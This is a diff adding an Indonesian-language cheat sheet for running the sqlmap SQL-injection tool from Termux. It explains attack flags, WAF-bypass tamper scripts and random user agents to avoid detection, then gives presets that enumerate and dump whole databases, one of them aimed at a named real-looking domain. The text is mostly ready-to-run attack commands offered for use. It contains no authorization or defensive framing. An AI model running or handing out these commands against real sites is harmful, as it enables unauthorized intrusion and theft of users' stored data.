@@ -1,0 +1,89 @@
+
+RUN IN TERMUX!
+-----------------------------------------
+pkg update && pkg upgrade
+pkg install python git
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap
+cd sqlmap
+python sqlmap.py
+-----------------------------------------
+
+🔸️Command Attack
+python sqlmap.py -u "https://target.id/patch/test.php?id=1337"
+
+*🔸️Teknik SQL Injection*
+--technique=BEUST
+
+B = Boolean-based blind
+E = Error-based
+U = UNION query
+S = Stacked queries
+T = Time-based blind
+
+-----------------------------------------
+*🔸️Level Pengujian*
+--level=5
+
+1-5
+Level 5 = paling dalam (test semua parameter termasuk header, cookie, dll)
+
+-----------------------------------------
+*🔸️Risk Level*
+--risk=3
+
+1-3
+Risk 3 = paling berisiko (bisa menyebabkan perubahan data di DB)
+
+-----------------------------------------
+*🔸️Tamper Script*
+--tamper=space2mysqlblank
+
+Mengubah payload untuk bypass WAF/filter
+space2mysqlblank = mengganti spasi jadi karakter kosong khusus MySQL
+
+-----------------------------------------
+*🔸️Random User-Agent*
+--random-agent
+
+Mengacak User-Agent setiap request
+Biar terlihat seperti browser biasa dan hindari deteksi
+
+-----------------------------------------
+*🔸️Time Delay*
+--time-sec=2
+
+Dipakai untuk teknik time-based
+Delay 2 detik untuk deteksi respon server
+
+-----------------------------------------
+*🔸️Enumerasi Database*
+--dbs
+
+Menampilkan daftar database di server target
+
+-----------------------------------------
+*🔸️Mode Non-Interaktif*
+--batch
+
+Menjawab semua prompt otomatis (yes default)
+Cocok buat automation
+
+-----------------------------------------
+HOW TO DUMP DATABASE
+
+🔸️Pilih Database
+-D mydb
+🔸️Pilih Tabel
+-T user
+🔸️Dump Data
+--dump
+🔸️Format CSV Delimiter
+--csv-del=";"
+-----------------------------------------
+
+PRESET
+𝐀𝐮𝐭𝐨 𝐆𝐞𝐭 𝐝𝐛
+python sqlmap.py -u "https:///uksec.or.id/news.php?id=100" --technique=BEUST --level=5 --risk=3 --tamper=space2mysqlblank --random-agent --time-sec=2 --dbs --batch
+
+𝐀𝐮𝐭𝐨 𝐃𝐮𝐦𝐩 𝐝𝐛
+python sqlmap.py -u "" -D your_db --dump-all --csv-del=";" --output-dir=/sdcard/sqlmap_dump --batch --random-agent
